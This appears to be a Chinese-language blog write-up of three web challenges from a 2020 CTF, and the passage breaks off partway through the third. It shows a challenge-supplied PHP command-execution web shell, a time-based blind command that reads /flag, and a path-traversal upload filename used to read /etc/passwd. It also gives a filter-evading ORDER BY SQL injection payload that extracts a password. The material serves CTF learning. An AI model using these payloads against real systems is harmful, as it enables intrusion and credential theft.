---
layout: post
title: BJDCTF 3rd × DASCTF May Web Writeup
data: 2020-05-22
categories: Writeups
tags: 
 - CTF
 - Writeup
description:  
excerpt_separator: ""
---

# 帮帮小红花

## 题目描述

上来是个黑页，给了木马的内容：

```php
<?
php shell_exec($_GET["imagin"]);?
>
```

## 解题思路

木马没有回显，试着ping一下DNSlog，没反应，然后试了curl也不行，把回显打出去应该是没什么希望了。

不过其实题目没有对关键字做什么过滤，所以我们可以用时间盲注的思路来获得命令结果。

而且题目给了flag的位置，可以命令行执行这样的PHP代码：

```bash
php -r '$flag=file_get_contents("/flag");if (ord($flag[0])==66) {sleep(1);}'
```

来获得flag。

## 备注

1. 可能时间盲注的经验还是不太多，而且这道题网络不是很稳定，脚本写得很吃力。

---

# gob

## 题目描述

刚打开是个登录界面，随便输入一个账号密码登录，进入之后有两个功能，show和upload。

## 解题思路

先上传一张图片试试，成功后有回显：

```
{admin hhhh ./uploads/3e104cae6401d2576676b2c68973154d/foo.jpeg ed1fb76fd040aa32984affdbbcf255f2}上传成功！您的路径是foo.jpeg
```

然后在show功能下可以看到上传的图片。在后面的测试中发现文件上传没有任何过滤，不过即使上传了PHP文件也没什么用，它会被当作TXT直接返回。

然后发现了show的图片显示利用了data协议，所以考虑利用它读文件。

而且当上传的文件名已存在时，会有回显提示，但不会修改文件内容。同时接下来使用show功能时，显示的图片是刚刚所上传的文件名所指向的文件。

可以试着目录穿越，先在文件上传时抓包修改上传文件的文件名：

```
../../index.php
```

没成功，不死心，又试了一次/etc/passwd，居然成功了。

再试着读一下/flag，得到flag。

## 备注

1. 不太明白，难道说业务逻辑文件和用户上传文件不在同一个服务器？

---

# Multiplayer Sports

## 题目描述

题目是这样子的：

![1](https://glyuan419.github.io/uploads/posts/2020-05-22-BJDCTF-3rd-Web/Multiplayer_Sports01.png)

## 解题思路

看页面源码发现又SQL注入，位置是order by：

```
?by=desc
```

会改变右边表格的顺序。接下来就是寻找利用方式，拦截了很多字符：

```
<|>|=|"|'|and|info|substr|where .etc
```

可以利用位异或符号：

```
select * from user order by id ^ 0
```

修改最后一位为0或1会有不同的回显。

"="可以用case语句绕过，substr可以用replace()+length()函数绕过，列名的问题也比较容易绕过。至于表名，其实是猜的，也比较常见，是"user"。Payload如下：

```
?by=^(case(replace(length(replace((select group_concat(`3`) from (select 1, 2, 3 union select * from user)a), 0x332c, 0x00)), 15, 200))when(200)then(1)else(0)end) limit 1,1;
```

0x332c对应的是"3,"，也就是"3,\<password>"的开头，另外首先要以类似的方法获得password的长度。

脚本跑出来密码是："T1Me cTRol13r"。

用admin登录后多了两个功能，getFlag和Request。点击getFlag。他让我爬，爬爬爬。再看看Request：

![2](https://glyuan419.github.io/uploads/posts/2020-05-22-BJDCTF-3rd-Web/Multiplayer_Sports02.png)

url输入www.baidu.com，有报错：

![3](https://glyuan419.github.io/uploads/posts/2020-05-22-BJDCTF-3rd-Web/Multiplayer_Sports03.png)

golong？